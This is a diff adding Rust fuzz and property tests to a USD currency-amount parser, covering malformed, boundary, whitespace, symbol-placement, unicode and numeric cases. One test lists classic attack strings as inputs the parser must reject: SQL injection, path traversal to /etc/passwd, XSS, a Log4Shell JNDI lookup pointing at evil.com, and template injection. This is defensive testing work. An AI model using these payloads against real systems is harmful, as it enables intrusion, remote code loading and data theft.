@@ -340,4 +340,154 @@ mod tests {
         assert_eq!(a2, a3);
         assert_eq!(a3, a4);
     }
+
+    // ========================================================================
+    // Fuzz/Property-Based Security Tests (Section 5.2)
+    // ========================================================================
+
+    #[test]
+    fn test_fuzz_random_strings_no_panic() {
+        // Property: Parser should never panic, always return Ok or Err
+        let long_string = "x".repeat(1000);
+        let test_cases = vec![
+            "",
+            " ",
+            "abc",
+            "12.34.56",
+            "999999999999999999999999999",
+            "-",
+            ".",
+            "$",
+            "USD",
+            "<script>alert('xss')</script>",
+            "12.34\n\r\t",
+            "12.34\0",
+            "∞",
+            "NaN",
+            "1e308",
+            "-1e308",
+            &long_string,
+        ];
+
+        for input in test_cases {
+            // Should not panic
+            let _ = Amount::<USD>::parse(input);
+        }
+    }
+
+    #[test]
+    fn test_fuzz_malicious_inputs() {
+        // Security: Test various attack vectors
+        let malicious = vec![
+            "'; DROP TABLE amounts; --",
+            "../../../etc/passwd",
+            "<img src=x onerror=alert(1)>",
+            "${jndi:ldap://evil.com/a}",
+            "{{7*7}}",
+            "${7*7}",
+            "\\x00\\x01\\x02",
+            "%00%00%00",
+        ];
+
+        for input in malicious {
+            let result = Amount::<USD>::parse(input);
+            // Should reject all malicious inputs
+            assert!(result.is_err(), "Should reject: {}", input);
+        }
+    }
+
+    #[test]
+    fn test_fuzz_boundary_values() {
+        // Test extreme but valid values
+        let boundaries = vec![
+            "0",
+            "0.00",
+            "-0",
+            "0.01",
+            "-0.01",
+            "999999999999",
+            "-999999999999",
+            "0.0000000001",
+        ];
+
+        for input in boundaries {
+            // Should handle all valid boundary cases
+            let result = Amount::<USD>::parse(input);
+            assert!(result.is_ok(), "Failed to parse valid input: {}", input);
+        }
+    }
+
+    #[test]
+    fn test_fuzz_whitespace_variations() {
+        // Property: Whitespace should not affect parsing
+        let base = Amount::<USD>::parse("12.34").unwrap();
+
+        let variations = vec![" 12.34", "12.34 ", "  12.34  ", "\t12.34\t", "12.34\n"];
+
+        for input in variations {
+            let parsed = Amount::<USD>::parse(input).unwrap();
+            assert_eq!(parsed, base, "Whitespace affected parsing: {:?}", input);
+        }
+    }
+
+    #[test]
+    fn test_fuzz_symbol_placement() {
+        // Property: Symbol must be at the start
+        let _valid = Amount::<USD>::parse("$12.34").unwrap();
+
+        let invalid_placements = vec![
+            "12.34$", // Symbol at end
+            "12$.34", // Symbol in middle
+            "12.3$4", // Symbol in middle
+        ];
+
+        for input in invalid_placements {
+            let result = Amount::<USD>::parse(input);
+            assert!(result.is_err(), "Should reject misplaced symbol: {}", input);
+        }
+    }
+
+    #[test]
+    fn test_fuzz_unicode_safety() {
+        // Property: Parser handles unicode safely
+        let unicode_cases = vec![
+            "€12.34",     // EUR symbol (should error for USD)
+            "£12.34",     // GBP symbol (should error for USD)
+            "¥12.34",     // JPY symbol (should error for USD)
+            "₿12.34",     // BTC symbol (should error for USD)
+            "12.34€",     // Symbol at wrong position
+            "１２．３４", // Fullwidth numbers
+        ];
+
+        for input in unicode_cases {
+            let result = Amount::<USD>::parse(input);
+            // Most should error (wrong currency), but shouldn't panic
+            let _ = result; // Consume result, just checking no panic
+        }
+    }
+
+    #[test]
+    fn test_fuzz_numeric_edge_cases() {
+        // Property: Parser correctly handles numeric edge cases
+        let cases = vec![
+            ("0", 0),
+            ("0.0", 0),
+            ("0.00", 0),
+            ("1", 100),
+            ("1.0", 100),
+            ("1.00", 100),
+            ("-1", -100),
+            ("-1.00", -100),
+        ];
+
+        for (input, expected_minor) in cases {
+            let amount = Amount::<USD>::parse(input).unwrap();
+            assert_eq!(
+                amount.to_minor(),
+                expected_minor,
+                "Failed for input: {}",
+                input
+            );
+        }
+    }
 }
